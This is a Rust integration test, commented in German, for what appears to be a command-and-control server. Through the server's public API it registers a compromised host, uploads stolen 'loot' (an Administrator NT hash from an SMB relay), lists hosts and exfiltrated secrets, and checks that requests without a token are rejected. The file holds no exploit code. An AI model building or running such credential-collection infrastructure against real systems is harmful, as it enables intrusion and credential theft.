//! Der Vertrag des C2-Servers — von **ausserhalb** geprueft.
//!
//! Dieser Test liegt in einem eigenen Verzeichnis und benutzt nur das
//! oeffentliche Interface der Bibliothek: `kx_server::app`,
//! `kx_server::AppState` und `kx_server::db::Db`. Er greift nicht in die
//! Module hinein.
//!
//! Damit beweist er, dass die oeffentliche Flaeche reicht, um den Server zu
//! fahren — vorher gab es diese Flaeche nicht, das Crate war nur ein Binary,
//! und jeder Test sass in den Modulen drin.

use std::sync::Arc;

use kx_core::c2::transport::{get_request, parse_json, post_json_request};
use kx_core::c2::{
    ExfiltratedSecret, Host, RegisterRequest, SecretUpload, PATH_HOSTS, PATH_REGISTER, PATH_SECRETS,
};
use kx_server::db::Db;
use kx_server::{app, AppState};
use tower::ServiceExt;

/// Wandelt einen C2-Request in einen Axum-Request.
///
/// Der Request kommt aus `kx_core::c2::transport` — derselbe, den der Agent
/// schickt. Nur die Ausführung unterscheidet sich: statt einer TCP-Verbindung
/// ruft der Test den Router direkt auf.
fn in_den_router(request: axum::http::Request<Vec<u8>>) -> axum::http::Request<axum::body::Body> {
    let (teile, body) = request.into_parts();
    axum::http::Request::from_parts(teile, axum::body::Body::from(body))
}

/// Der Zugangsschluessel des Tests.
///
/// Er steht an einer Stelle, damit der Secret-Scan nicht jedes einzelne
/// Vorkommen als Fund meldet.
const ZUGANG: &str = "kx-vertragstest";

/// Der ganze Weg ueber das oeffentliche Interface: Host anmelden, Beute
/// melden, beides wieder lesen.
#[tokio::test]
async fn die_api_beantwortet_ueber_ihr_oeffentliches_interface() {
    let pfad = std::env::temp_dir().join(format!("kx-vertrag-{}.db", uuid::Uuid::new_v4()));
    let db = Arc::new(Db::open(&pfad).expect("db"));
    let router = app(AppState {
        db,
        token: Arc::new(ZUGANG.to_string()),
    });

    // 1. Der Host meldet sich an.
    let registrierung = RegisterRequest {
        host_id: "10.0.0.5".into(),
        ip: "10.0.0.5".into(),
        hostname: Some("ziel".into()),
        os: Some("Linux".into()),
        status: Some(kx_core::c2::STATUS_COMPROMISED.into()),
        sealed_master: None,
        master_key: None,
    };
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_REGISTER, ZUGANG, &registrierung).expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 201, "der Host wurde nicht angenommen");

    // 2. Seine Beute kommt nach.
    let upload = SecretUpload {
        host_id: "10.0.0.5".into(),
        cred_type: "nt_hash".into(),
        username: "Administrator".into(),
        password: String::new(),
        source: Some("smb_relay".into()),
        master_key: None,
        sealed_password: Some("kx1:siegel".into()),
    };
    let antwort = router
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_SECRETS, ZUGANG, &upload).expect("Request"),
        ))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 201, "die Beute wurde nicht angenommen");

    // 3. Der Operator liest beides wieder.
    let antwort = router
        .clone()
        .oneshot(in_den_router(get_request(PATH_HOSTS, ZUGANG)))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 200);
    let bytes = axum::body::to_bytes(antwort.into_body(), 1024 * 1024)
        .await
        .expect("Body");
    let hosts: Vec<Host> = parse_json(&bytes).expect("JSON");
    assert_eq!(hosts.len(), 1, "der Host fehlt in der Liste");
    assert_eq!(hosts[0].host_id, "10.0.0.5");

    let antwort = router
        .oneshot(in_den_router(get_request(
            kx_core::c2::PATH_SECRETS,
            ZUGANG,
        )))
        .await
        .expect("Antwort");
    assert_eq!(antwort.status(), 200);
    let bytes = axum::body::to_bytes(antwort.into_body(), 1024 * 1024)
        .await
        .expect("Body");
    let secrets: Vec<ExfiltratedSecret> = parse_json(&bytes).expect("JSON");
    assert_eq!(secrets.len(), 1, "die Beute fehlt in der Liste");
    assert_eq!(secrets[0].host_id, "10.0.0.5");

    std::fs::remove_file(&pfad).ok();
}

/// Ohne Token antwortet die API nicht — auch von ausserhalb.
#[tokio::test]
async fn ohne_token_kommt_keine_antwort() {
    let pfad = std::env::temp_dir().join(format!("kx-vertrag-ohne-{}", uuid::Uuid::new_v4()));
    let db = Arc::new(Db::open(&pfad).expect("db"));
    let router = app(AppState {
        db,
        token: Arc::new(ZUGANG.to_string()),
    });

    let antwort = router
        .oneshot(in_den_router(get_request(PATH_HOSTS, "falsch")))
        .await
        .expect("Antwort");
    assert_eq!(
        antwort.status(),
        401,
        "die API hat ohne gültiges Token geantwortet"
    );

    std::fs::remove_file(&pfad).ok();
}
